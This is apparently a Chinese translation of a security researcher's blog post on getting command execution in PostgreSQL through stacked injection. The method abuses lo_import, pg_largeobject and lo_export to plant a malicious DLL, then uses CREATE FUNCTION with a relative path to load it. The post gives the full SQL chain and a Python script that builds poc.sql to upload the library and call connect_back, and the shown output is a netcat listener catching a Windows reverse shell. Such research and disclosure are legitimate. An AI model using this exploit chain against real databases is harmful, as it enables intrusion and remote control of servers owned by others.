> 原文链接: https://www.anquanke.com//post/id/215954 


# Pgsql堆叠注入场景下通过`CREATE FUNCTION`来实现命令执行


                                阅读量   
                                **123318**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Steven Seeley，文章来源：srcincite.io
                                <br>原文地址：[https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t0156b686f4bd1947cb.png)](https://p5.ssl.qhimg.com/t0156b686f4bd1947cb.png)



## 2. 前言

在本篇文章中我将分享如何在`PostgreSQL`堆叠注入场景中通过`CREATE FUNCTION`关键字来实现命令执行的思路。

简要信息如下：
- CVE：N/A
- CVSS：4.1 (AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L)
- 适用环境：Windows、Linux、Unix
在新版的`PostgreSQL`中：
- 12.3
- 11.8
- 10.13
- 9.6.18
- 9.5.22
其数据库超管用户被限制只允许从默认目录读取后缀为`.dll`或`.so`动态库文件，举例如下：
<li>Windows：`C:\Program Files\PostgreSQL\11\lib`
</li>
<li>Unix/Linux：`/var/lib/postgresql/11/lib`
</li>
此外，默认情况下`NETWORK_SERVICE`与`postgres`这两个系统用户对该目录均无写入权限。但是经过鉴权的数据库超管用户可以通过调用`lo_import`函数将文件写入`pg_largeobject`系统表，再更新对应的数据内容将原本的内容替换为我们的恶意代码（通常是反弹个shell），随后通过`lo_export`函数转储数据至动态库目录，最终生成我们的恶意动态库文件。`CREATE FUNCTION`的另一个骚操作就是可以接收指定目录来遍历其动态库中的相关函数。因此只要已鉴权用户可以将动态库文件写入对应的存储目录，然后通过`CREATE FUNCTION`的目录遍历特性来加载动态库文件就可以实现命令执行。



## 3. 利用流程

### 3.1. 通过`lo_import`获得一个`OID`

`pg_largeobject`系统表保存了那些标记为`large object(大对象)`的数据。 每个`大对象`都会关联其被创建成功时分配的`OID`标志。此后`大对象`都分解成足够小的数据块并关联`pageno`字段来存储`pg_largeobject`里。每页的数据定义为`LOBLKSIZE(目前是BLCKSZ/4或者通常是 2K 字节)`。<br>
该过程需使用`lo_import`函数，举例如下:

```
select lo_import('C:/Windows/win.ini',1337);
#不是必须使用`C:/Windows/win.ini`,任意一个存在的绝对路径都行，只是为了得到一个OID，在本例中OID为1337
```

在Windwos场景下这里我们还可以使用[`UNC路径`](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/using-unc-shares)，如果使用该项技术则可跳过3.3，但我希望兼容Unix/Windows平台，所有没有使用。

### 3.2. 基于`OID`来进行数据替换

现在，我们基于`OID`的值来替换`pg_largeobject`表中的数据，将其对应内容替换为我们的恶意代码。这些`恶意代码`最终需要基于目标数据库的完整版本来进行编译还要匹配对应的系统架构。对于超过2048字节大小的文件，`pg_largeobject`表需使用`pageno`字段来将文件分割成大小为2048字节大小的数据块。分割示例如下：

```
update pg_largeobject SET pageno=0, data=decode(4d5a90...) where loid=1337;
insert into pg_largeobject(loid, pageno, data) values (1337, 1, decode(74114d...));
insert into pg_largeobject(loid, pageno, data) values (1337, 2, decode(651400...));
...
```

通过使用PostgreSQL中的[`object identifier types`](https://www.postgresql.org/docs/8.1/datatype-oid.html)，可以跳过第1阶段（并且仅对第2阶段执行单个语句执行），但是我没有时间确认这一点。

### 3.3. 使用`lo_export`函数生成恶意动态库

现在我们可以通过`lo_export`来转储之前变相导入的数据来生恶意的动态库文件。不过这一步不能指定目录，因为这样做会触发`PostgreSQL`内置的安全检查，而且就算能绕过该检查，`NETWORK_SERVICE`（Unix/Linux场景下为`postgres`）帐户也存在路径限制，搞不定搞不定。

```
select lo_export(1337, 'poc.dll');
# 导出的poc.dll会存储在默认的动态库目录
```

### <a class="reference-link" name="3.4.%20%E5%9F%BA%E4%BA%8E%E6%81%B6%E6%84%8F%E5%8A%A8%E6%80%81%E5%BA%93%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"></a>3.4. 基于恶意动态库文件创建函数

我在以往的研究中提到过，可以使用绝对路径（包括`UNC`）来加载基于`Postgresql 9.x`的扩展从而执行系统命令。`[@zerosum0x0](https://github.com/zerosum0x0)`师傅也有相关的[操作笔记](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)。不过那个时候对系统用户的文件操作权限并没有那么多的限制。

```
create function connect_back(text, integer) returns void as '//attacker/share/poc.dll', 'connect_back' language C strict;
```

如今几年过去了，PostgreSQL官方决定禁用`CREATE FUNCTION`时使用绝对路径导致现在这种技术已经失效了。不过现在我们可以很方便地从对应的默认动态库目录中遍历并加载我们转储的恶意动态库文件，举例如下：

```
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
# 作者注入的恶意代码就是用来反弹shell的，因此创建函数才如此构造，实际场景中可根据需要自定义。
```

### <a class="reference-link" name="3.4.%20%E5%8F%8D%E5%BC%B9shell"></a>3.4. 反弹shell

成功创建`connect_back`函数后，直接通过`select`指令来调用：

```
select connect_back('192.168.100.54', 1234);
```



## 4. 问题现状

[`ZDI团队`](https://www.zerodayinitiative.com/)咨询过PostgreSQL官方对该问题的意见，但无后文，后来我得知官方并不打算修复此问题，因为官方认为该问题属于正常系统功能而不是漏洞。



## 5. 造个轮子

代码如下，将生成poc.sql文件，以超管用户在数据库上逐步执行，或将poc.sql中的sql命令逐个通过注入点执行：

```
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
    print("(+) usage %s &lt;connectback&gt; &lt;port&gt; &lt;dll/so&gt;" % sys.argv[0])
    print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```

跑一下展示下效果：

```
steven@pluto:~/postgres-rce$ ./poc.py 
(+) usage ./poc.py &lt;connectback&gt; &lt;port&gt; &lt;dll/so&gt;
(+) eg: ./poc.py 192.168.100.54 1234
steven@pluto:~/postgres-rce$ ./poc.py 192.168.100.54 1234 si-x64-12.dll
(+) building poc.sql file
(+) run poc.sql in PostgreSQL using the superuser
(+) for a db cleanup only, run the following sql:
    SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;
    DROP FUNCTION connect_back(text, integer);
steven@pluto:~/postgres-rce$ nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 192.168.100.122 49165 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\PostgreSQL\12\data&gt;whoami
nt authority\network service

C:\Program Files\PostgreSQL\12\data&gt;
```
